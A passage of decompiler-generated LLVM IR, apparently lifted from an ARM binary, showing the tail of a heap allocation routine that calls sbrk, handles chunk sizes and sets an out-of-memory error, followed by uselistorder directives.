  %v0_12398 = load i32, i32* @r4, align 4
  %v7_12398 = icmp eq i32 %v0_12398, -1
  br i1 %v7_12398, label %dec_label_pc_125bc, label %dec_label_pc_123a0

dec_label_pc_123a0:                               ; preds = %dec_label_pc_12398
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v4_123a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_123a8, i32* %ip.global-to-local, align 4
  store i32 %v3_122d8, i32* %r2.global-to-local, align 4
  %v1_123b0 = add i32 %v4_123a8, 872
  %v2_123b0 = inttoptr i32 %v1_123b0 to i32*
  %v3_123b0 = load i32, i32* %v2_123b0, align 4
  %v1_123b4 = load i32, i32* @r8, align 4
  %v2_123b4 = add i32 %v1_123b4, %v3_122d8
  store i32 %v2_123b4, i32* %r1.global-to-local, align 4
  %v0_123b8 = load i32, i32* @r5, align 4
  %v2_123b8 = add i32 %v0_123b8, %v3_123b0
  store i32 %v2_123b8, i32* %r3.global-to-local, align 4
  %v9_123bc = icmp eq i32 %v0_12398, %v2_123b4
  br i1 %v9_123bc, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_123a0
  store i32 %v2_123b8, i32* %v2_123b0, align 4
  br label %dec_label_pc_123d8

bb162:                                            ; preds = %dec_label_pc_123a0
  %v1_123c0 = load i32, i32* %r0.global-to-local, align 4
  %v8_123c0 = icmp eq i32 %v1_123c0, -1
  store i32 %v2_123b8, i32* %v2_123b0, align 4
  br i1 %v8_123c0, label %.thread37, label %dec_label_pc_123d8

.thread37:                                        ; preds = %bb162
  %v1_123c8 = load i32, i32* @r5, align 4
  %v2_123c8 = load i32, i32* @r8, align 4
  %v3_123c8 = add i32 %v2_123c8, %v1_123c8
  %v2_123cc = or i32 %v3_123c8, 1
  store i32 %v2_123cc, i32* %r3.global-to-local, align 4
  %v2_123d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_123d0 = add i32 %v2_123d0, 4
  %v4_123d0 = inttoptr i32 %v3_123d0 to i32*
  store i32 %v2_123cc, i32* %v4_123d0, align 4
  br label %dec_label_pc_12550

dec_label_pc_123d8:                               ; preds = %bb162, %.thread125
  %v0_123dc.pr = load i32, i32* @r8, align 4
  %v0_123d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_123d8 = add i32 %v0_123d8, 864
  %v2_123d8 = inttoptr i32 %v1_123d8 to i32*
  %v3_123d8 = load i32, i32* %v2_123d8, align 4
  store i32 %v3_123d8, i32* %r2.global-to-local, align 4
  %v2_123dc = icmp eq i32 %v0_123dc.pr, 0
  br i1 %v2_123dc, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_123d8
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_123d8
  %v2_123e4 = urem i32 %v3_123d8, 2
  store i32 %v2_123e4, i32* %r3.global-to-local, align 4
  %v2_123e8 = icmp eq i32 %v2_123e4, 0
  br i1 %v2_123e8, label %.thread43, label %dec_label_pc_123f0

dec_label_pc_123f0:                               ; preds = %.thread39
  %v0_123f0 = load i32, i32* @r4, align 4
  %v1_123f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_123f0 = icmp ult i32 %v0_123f0, %v1_123f0
  br i1 %v3_123f0, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_123f0
  %v2_123f4 = and i32 %v3_123d8, -2
  store i32 %v2_123f4, i32* %r3.global-to-local, align 4
  store i32 %v2_123f4, i32* %v2_123d8, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_123f0, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %ip.global-to-local, align 4
  %v4_12404 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12404, i32* @r7, align 4
  %v1_12408 = add i32 %v4_12404, 864
  %v2_12408 = inttoptr i32 %v1_12408 to i32*
  %v3_12408 = load i32, i32* %v2_12408, align 4
  store i32 %v3_12408, i32* %r3.global-to-local, align 4
  %v1_1240c = urem i32 %v3_12408, 2
  store i32 %v1_1240c, i32* @r6, align 4
  %v2_1240c = icmp eq i32 %v1_1240c, 0
  br i1 %v2_1240c, label %dec_label_pc_124a0, label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %.thread43
  %v0_12414 = load i32, i32* @r8, align 4
  %v2_12414 = icmp eq i32 %v0_12414, 0
  br i1 %v2_12414, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12414
  %v2_12418 = add i32 %v4_12404, 872
  %v3_12418 = inttoptr i32 %v2_12418 to i32*
  %v4_12418 = load i32, i32* %v3_12418, align 4
  store i32 %v4_12418, i32* %r2.global-to-local, align 4
  %v1_1241c = load i32, i32* %r1.global-to-local, align 4
  %v2_1241c = load i32, i32* @r4, align 4
  %v3_1241c = sub i32 %v2_1241c, %v1_1241c
  %v3_12420 = add i32 %v3_1241c, %v4_12418
  store i32 %v3_12420, i32* %r3.global-to-local, align 4
  store i32 %v3_12420, i32* %v3_12418, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12414, %bb164
  %v0_12428 = load i32, i32* @r4, align 4
  %v1_12428 = urem i32 %v0_12428, 8
  store i32 %v1_12428, i32* %r3.global-to-local, align 4
  %v2_12428 = icmp eq i32 %v1_12428, 0
  br i1 %v2_12428, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_1242c = sub nsw i32 8, %v1_12428
  store i32 %v2_1242c, i32* %r3.global-to-local, align 4
  %v3_12430 = add i32 %v2_1242c, %v0_12428
  store i32 %v3_12430, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12438 = phi i32 [ 0, %.thread46 ], [ %v2_1242c, %bb165 ]
  %v1_12434 = load i32, i32* @r5, align 4
  %v2_12434 = add i32 %v1_12434, %v0_12428
  store i32 %v2_12434, i32* @r6, align 4
  %v1_12438 = load i32, i32* @r8, align 4
  %v2_12438 = add i32 %v2_12434, %v0_12438
  %v2_1243c = add i32 %v2_12438, %v1_12438
  store i32 %v2_1243c, i32* %r1.global-to-local, align 4
  %v1_12440 = load i32, i32* %sb.global-to-local, align 4
  %v2_12440 = add i32 %v1_12440, %v2_1243c
  %v1_12444 = load i32, i32* %fp.global-to-local, align 4
  %v2_12444 = and i32 %v1_12444, %v2_12440
  store i32 %v2_12444, i32* %r2.global-to-local, align 4
  %v2_12448 = sub i32 0, %v2_12434
  store i32 %v2_12448, i32* %r3.global-to-local, align 4
  %v2_1244c = sub i32 %v2_12444, %v2_12434
  store i32 %v2_1244c, i32* @r5, align 4
  store i32 %v2_1244c, i32* %r0.global-to-local, align 4
  br i1 %v2_12428, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12428, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12458 = call i32 @__GI_sbrk(i32 %v2_1244c)
  store i32 %v1_12458, i32* %r0.global-to-local, align 4
  %v3_1245c = icmp eq i32 %v1_12458, -1
  br i1 %v3_1245c, label %dec_label_pc_12464, label %dec_label_pc_12474

dec_label_pc_12464:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12468 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12468, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_124cc

dec_label_pc_12474:                               ; preds = %bb167
  %v1_12474 = load i32, i32* @r4, align 4
  %v3_12474 = icmp ult i32 %v1_12458, %v1_12474
  br i1 %v3_12474, label %dec_label_pc_1247c, label %dec_label_pc_124cc

dec_label_pc_1247c:                               ; preds = %dec_label_pc_12474
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r0.global-to-local, align 4
  %v4_12484 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12484, i32* %r2.global-to-local, align 4
  %v1_12488 = add i32 %v4_12484, 864
  %v2_12488 = inttoptr i32 %v1_12488 to i32*
  %v3_12488 = load i32, i32* %v2_12488, align 4
  %v0_1248c = load i32, i32* @r6, align 4
  store i32 %v0_1248c, i32* %r0.global-to-local, align 4
  %v1_12490 = and i32 %v3_12488, -2
  store i32 %v1_12490, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12490, i32* %v2_12488, align 4
  br label %dec_label_pc_124cc

dec_label_pc_124a0:                               ; preds = %.thread43
  %v0_124a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_124a0 = icmp eq i32 %v0_124a0, -1
  br i1 %v3_124a0, label %dec_label_pc_124a8, label %dec_label_pc_124c4

dec_label_pc_124a8:                               ; preds = %dec_label_pc_124a0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_124ac = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_124ac, i32* %r0.global-to-local, align 4
  %v0_124b0 = load i32, i32* @r7, align 4
  %v1_124b0 = add i32 %v0_124b0, 872
  %v2_124b0 = inttoptr i32 %v1_124b0 to i32*
  %v3_124b0 = load i32, i32* %v2_124b0, align 4
  store i32 %v3_124b0, i32* %r2.global-to-local, align 4
  %v0_124b4 = load i32, i32* @r4, align 4
  %v0_124b8 = load i32, i32* @r5, align 4
  %v2_124b4 = add i32 %v3_124b0, %v1_124ac
  %v2_124b8 = sub i32 %v2_124b4, %v0_124b4
  %v2_124bc = sub i32 %v2_124b8, %v0_124b8
  store i32 %v2_124bc, i32* %r3.global-to-local, align 4
  store i32 %v2_124bc, i32* %v2_124b0, align 4
  %v0_124c8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_124c4

dec_label_pc_124c4:                               ; preds = %dec_label_pc_124a0, %dec_label_pc_124a8
  %v0_124c8 = phi i32 [ 0, %dec_label_pc_124a0 ], [ %v0_124c8.pre, %dec_label_pc_124a8 ]
  %v0_124c4 = load i32, i32* @r4, align 4
  store i32 %v0_124c4, i32* @r7, align 4
  store i32 %v0_124c8, i32* @r5, align 4
  br label %dec_label_pc_124cc

dec_label_pc_124cc:                               ; preds = %dec_label_pc_12474, %dec_label_pc_1247c, %dec_label_pc_12464, %dec_label_pc_124c4
  %v0_124cc = load i32, i32* %r0.global-to-local, align 4
  %v7_124cc = icmp eq i32 %v0_124cc, -1
  br i1 %v7_124cc, label %dec_label_pc_12550, label %dec_label_pc_124d4

dec_label_pc_124d4:                               ; preds = %dec_label_pc_124cc
  %v1_124d4 = load i32, i32* @r5, align 4
  %v2_124d4 = add i32 %v1_124d4, %v0_124cc
  %v0_124d8 = load i32, i32* @r7, align 4
  %v2_124d8 = sub i32 %v2_124d4, %v0_124d8
  %v1_124dc = or i32 %v2_124d8, 1
  %v2_124e0 = add i32 %v0_124d8, 4
  %v3_124e0 = inttoptr i32 %v2_124e0 to i32*
  store i32 %v1_124dc, i32* %v3_124e0, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_124ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_124ec, i32* @r6, align 4
  %v1_124f0 = add i32 %v4_124ec, 872
  %v2_124f0 = inttoptr i32 %v1_124f0 to i32*
  %v3_124f0 = load i32, i32* %v2_124f0, align 4
  %v0_124f4 = load i32, i32* @r8, align 4
  %v2_124f4 = icmp eq i32 %v0_124f4, 0
  %v0_124f8 = load i32, i32* @r5, align 4
  %v2_124f8 = add i32 %v0_124f8, %v3_124f0
  store i32 %v2_124f8, i32* %r3.global-to-local, align 4
  store i32 %v2_124f8, i32* %v2_124f0, align 4
  %v0_12500 = load i32, i32* @r7, align 4
  %v1_12500 = load i32, i32* @r6, align 4
  %v2_12500 = add i32 %v1_12500, 44
  %v3_12500 = inttoptr i32 %v2_12500 to i32*
  store i32 %v0_12500, i32* %v3_12500, align 4
  br i1 %v2_124f4, label %dec_label_pc_12550, label %dec_label_pc_12508

dec_label_pc_12508:                               ; preds = %dec_label_pc_124d4
  %v0_1250c = load i32, i32* @r8, align 4
  %v1_1250c = add i32 %v0_1250c, -12
  %v1_12510 = and i32 %v1_1250c, -8
  store i32 %v3_122d8, i32* %ip.global-to-local, align 4
  %v2_12518 = add i32 %v1_12510, %v3_122d8
  store i32 %v2_12518, i32* %r1.global-to-local, align 4
  %v2_1251c = icmp ugt i32 %v1_12510, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12524 = or i32 %v1_12510, 1
  store i32 %v1_12524, i32* %r3.global-to-local, align 4
  store i32 %v1_12524, i32* %v2_122e4, align 4
  %v0_1252c = load i32, i32* %r2.global-to-local, align 4
  %v1_1252c = load i32, i32* %r1.global-to-local, align 4
  %v2_1252c = add i32 %v1_1252c, 8
  %v3_1252c = inttoptr i32 %v2_1252c to i32*
  store i32 %v0_1252c, i32* %v3_1252c, align 4
  %v0_12530 = load i32, i32* %r2.global-to-local, align 4
  %v1_12530 = load i32, i32* %r1.global-to-local, align 4
  %v2_12530 = add i32 %v1_12530, 4
  %v3_12530 = inttoptr i32 %v2_12530 to i32*
  store i32 %v0_12530, i32* %v3_12530, align 4
  br i1 %v2_1251c, label %dec_label_pc_12538, label %dec_label_pc_12550

dec_label_pc_12538:                               ; preds = %dec_label_pc_12508
  %v0_12538 = load i32, i32* @r6, align 4
  %v1_12538 = add i32 %v0_12538, 836
  %v2_12538 = inttoptr i32 %v1_12538 to i32*
  %v3_12538 = load i32, i32* %v2_12538, align 4
  store i32 %v3_12538, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12540 = load i32, i32* %ip.global-to-local, align 4
  %v1_12540 = add i32 %v0_12540, 8
  store i32 %v1_12540, i32* @r0, align 4
  store i32 -1, i32* %v2_12538, align 4
  %v0_12548 = call i32 @free()
  store i32 %v0_12548, i32* %r0.global-to-local, align 4
  %v0_1254c = load i32, i32* @r4, align 4
  %v1_1254c = load i32, i32* @r6, align 4
  %v2_1254c = add i32 %v1_1254c, 836
  %v3_1254c = inttoptr i32 %v2_1254c to i32*
  store i32 %v0_1254c, i32* %v3_1254c, align 4
  br label %dec_label_pc_12550

dec_label_pc_12550:                               ; preds = %.thread37, %dec_label_pc_12508, %dec_label_pc_124d4, %dec_label_pc_124cc, %dec_label_pc_12538
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r0.global-to-local, align 4
  %v4_12558 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 64) to i32*), align 4
  store i32 %v4_12558, i32* %lr.global-to-local, align 4
  %v1_1255c = add i32 %v4_12558, 872
  store i32 %v1_1255c, i32* %r1.global-to-local, align 4
  %v1_12560 = inttoptr i32 %v1_1255c to i32*
  %v2_12560 = load i32, i32* %v1_12560, align 4
  store i32 %v2_12560, i32* %r1.global-to-local, align 4
  %v3_12560 = add i32 %v4_12558, 876
  %v4_12560 = inttoptr i32 %v3_12560 to i32*
  %v5_12560 = load i32, i32* %v4_12560, align 4
  store i32 %v5_12560, i32* %r3.global-to-local, align 4
  %v1_12568 = add i32 %v4_12558, 868
  %v2_12568 = inttoptr i32 %v1_12568 to i32*
  %v3_12568 = load i32, i32* %v2_12568, align 4
  store i32 %v3_12568, i32* %r3.global-to-local, align 4
  %v1_1256c = add i32 %v4_12558, 884
  %v2_1256c = inttoptr i32 %v1_1256c to i32*
  %v3_1256c = load i32, i32* %v2_1256c, align 4
  store i32 %v3_1256c, i32* %r2.global-to-local, align 4
  %v2_12570 = add i32 %v3_12568, %v2_12560
  store i32 %v2_12570, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12560, %v5_12560
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12550
  store i32 %v2_12560, i32* %v4_12560, align 4
  %v0_12578.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12578.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12550, %bb168
  %v1_12578 = phi i32 [ %v3_1256c, %dec_label_pc_12550 ], [ %v1_12578.pre, %bb168 ]
  %v4_1257c = phi i32 [ %v2_12570, %dec_label_pc_12550 ], [ %v0_12578.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_1257c, %v1_12578
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_1257c = load i32, i32* %lr.global-to-local, align 4
  %v6_1257c = add i32 %v5_1257c, 884
  %v7_1257c = inttoptr i32 %v6_1257c to i32*
  store i32 %v4_1257c, i32* %v7_1257c, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12580 = load i32, i32* %lr.global-to-local, align 4
  %v1_12580 = add i32 %v0_12580, 44
  %v2_12580 = inttoptr i32 %v1_12580 to i32*
  %v3_12580 = load i32, i32* %v2_12580, align 4
  store i32 %v3_12580, i32* %ip.global-to-local, align 4
  %v1_12584 = add i32 %v3_12580, 4
  %v2_12584 = inttoptr i32 %v1_12584 to i32*
  %v3_12584 = load i32, i32* %v2_12584, align 4
  store i32 %v1_12198, i32* %r1.global-to-local, align 4
  %v1_1258c = and i32 %v3_12584, -4
  store i32 %v1_1258c, i32* %r3.global-to-local, align 4
  %v3_12590 = icmp ult i32 %v1_1258c, %v1_12198
  br i1 %v3_12590, label %dec_label_pc_125bc, label %dec_label_pc_12598

dec_label_pc_12598:                               ; preds = %bb171
  %v0_12598 = load i32, i32* @sl, align 4
  %v2_12598 = sub i32 %v1_1258c, %v0_12598
  %v2_1259c = add i32 %v0_12598, %v3_12580
  store i32 %v2_1259c, i32* %r1.global-to-local, align 4
  %v1_125a0 = or i32 %v2_12598, 1
  store i32 %v1_125a0, i32* %r3.global-to-local, align 4
  %v1_125a4 = or i32 %v0_12598, 1
  store i32 %v1_125a4, i32* %r2.global-to-local, align 4
  %v1_125a8 = add i32 %v3_12580, 8
  store i32 %v1_125a8, i32* %r0.global-to-local, align 4
  store i32 %v1_125a4, i32* %v2_12584, align 4
  %v0_125b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_125b0 = load i32, i32* %lr.global-to-local, align 4
  %v2_125b0 = add i32 %v1_125b0, 44
  %v3_125b0 = inttoptr i32 %v2_125b0 to i32*
  store i32 %v0_125b0, i32* %v3_125b0, align 4
  %v0_125b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_125b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_125b4 = add i32 %v1_125b4, 4
  %v3_125b4 = inttoptr i32 %v2_125b4 to i32*
  store i32 %v0_125b4, i32* %v3_125b4, align 4
  br label %dec_label_pc_125d4

dec_label_pc_125bc:                               ; preds = %bb160, %bb171, %dec_label_pc_12398
  store i32 62588, i32* %r3.global-to-local, align 4
  %v0_125c0 = call i32 @__aeabi_read_tp()
  %v3_125c4 = load i16, i16* @global_var_21a48.352, align 2
  %v4_125c4 = sext i16 %v3_125c4 to i32
  store i32 %v4_125c4, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_125cc = add i32 %v4_125c4, %v0_125c0
  %v4_125cc = inttoptr i32 %v3_125cc to i32*
  store i32 12, i32* %v4_125cc, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_125d4

dec_label_pc_125d4:                               ; preds = %bb154, %bb153, %dec_label_pc_12598, %dec_label_pc_121e0, %dec_label_pc_125bc
  %v0_125d4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_125d4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_125d8

dec_label_pc_125d8:                               ; preds = %.thread4, %dec_label_pc_121ac, %.thread124, %dec_label_pc_1201c, %dec_label_pc_12010, %dec_label_pc_11e78, %dec_label_pc_11dfc, %dec_label_pc_125d4
  store i32 %v2_11d1c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32* %r2.global-to-local, align 4
  %v4_125e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_219f0.357 to i32), i32 44) to i32*), align 4
  store i32 %v4_125e8, i32* @ip, align 4
  store i32 75252, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_125e8)
  br label %dec_label_pc_125f4

dec_label_pc_125f4:                               ; preds = %dec_label_pc_11d54, %dec_label_pc_125d8
  %v0_125f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_125f4, i32* %r0.global-to-local, align 4
  store i32 %v3_11cf0, i32* @r4, align 4
  store i32 %v6_11cf0, i32* @r5, align 4
  store i32 %v9_11cf0, i32* @r6, align 4
  store i32 %v12_11cf0, i32* @r7, align 4
  store i32 %v15_11cf0, i32* @r8, align 4
  store i32 %v18_11cf0, i32* @sb, align 4
  store i32 %v21_11cf0, i32* @sl, align 4
  store i32 %v24_11cf0, i32* @fp, align 4
  store i32 %v27_11cf0, i32* @lr, align 4
  ret i32 %v0_125f4

; uselistorder directives
  uselistorder i32 %v0_12598, { 1, 0, 2 }
  uselistorder i32 %v3_12580, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1257c, { 1, 0 }
  uselistorder i32 %v2_12560, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12558, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12510, { 1, 2, 0 }
  uselistorder i32 %v0_124d8, { 1, 0 }
  uselistorder i32 %v0_124cc, { 1, 0 }
  uselistorder i32 %v2_124bc, { 1, 0 }
  uselistorder i32 %v2_1244c, { 2, 1, 0 }
  uselistorder i32 %v2_12434, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1242c, { 1, 0, 2 }
  uselistorder i32 %v1_12428, { 2, 1, 0 }
  uselistorder i32 %v0_12428, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1240c, { 1, 0 }
  uselistorder i32 %v2_123e4, { 1, 0 }
  uselistorder i32 %v3_123d8, { 1, 0, 2 }
  uselistorder i32 %v2_123b8, { 1, 0, 2 }
  uselistorder i32* %v2_123b0, { 1, 0, 2 }
  uselistorder i32 %v0_12398, { 1, 0 }
  uselistorder i32 %v6_12374, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12360, { 2, 1, 0 }
  uselistorder i32 %v0_12348, { 1, 0 }
  uselistorder i32 %v2_12304, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12300, { 1, 0 }
  uselistorder i32 %v3_122d8, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_122b8, { 1, 0, 2 }
  uselistorder i32 %v2_122a0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_12248, { 2, 1, 0 }
  uselistorder i32 %v6_1223c, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12218, { 2, 1, 0, 3 }
  uselistorder i32 %v3_121d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12198, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12190, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1218c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_12178, { 1, 0 }
  uselistorder i32 %v7_12138, { 1, 0 }
  uselistorder i32 %v4_12138, { 1, 0 }
  uselistorder i32 %v0_12108, { 1, 0 }
  uselistorder i32 %v2_120dc, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_120d857, { 1, 0 }
  uselistorder i32 %v1_120a4, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1208c., { 1, 2, 0 }
  uselistorder i32 %v0_12094, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12094, { 1, 0 }
  uselistorder i32 %v3_12074, { 1, 0 }
  uselistorder i32 %v4_12070, { 1, 0, 2 }
  uselistorder i32 %v1_11fe0, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_12038, { 1, 0 }
  uselistorder i32 %v1_1201c, { 1, 0 }
  uselistorder i32 %v1_11ebc, { 1, 0 }
  uselistorder i32 %v0_11ffc, { 2, 0, 1, 3 }
  uselistorder i32 %v3_11fc4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_12058.pre, { 1, 2, 0 }
  uselistorder i32 %v0_11fa0, { 2, 1, 0 }
  uselistorder i32 %v3_11f94, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_11eb4, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_11f5c, { 1, 0 }
  uselistorder i32 %v3_11f50, { 1, 0 }
  uselistorder i32 %v0_11f5c, { 1, 0 }
  uselistorder i32 %v3_11f34, { 0, 2, 3, 1 }
  uselistorder i32 %v2_11f24, { 1, 0, 2 }
  uselistorder i32 %v3_11edc, { 2, 1, 0 }
  uselistorder i32 %v0_11ecc, { 3, 2, 1, 0 }
  uselistorder i32 %v0_11e9c, { 1, 0 }
  uselistorder i32 %v1_11e50, { 2, 1, 0, 3 }
  uselistorder i32 %v0_11e4c, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_11df0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_11de4, { 1, 0 }
  uselistorder i32 %v3_11db4, { 1, 0 }
  uselistorder i32 %v0_11da8, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_11d88, { 0, 2, 1, 3 }
  uselistorder i1 %v7_11d7c, { 1, 0 }
  uselistorder i32 %v0_11d4c, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 45, 42, 43, 44, 46, 47, 48, 49, 1, 2, 50, 51, 52, 53, 54, 55, 56, 57, 58, 63, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 83, 91, 78, 79, 80, 81, 82, 84, 85, 86, 87, 0, 88, 89, 90, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_125f4, { 1, 0 }
  uselistorder label %dec_label_pc_125d8, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_125d4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_125bc, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_12550, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_124cc, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_124c4, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12398, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
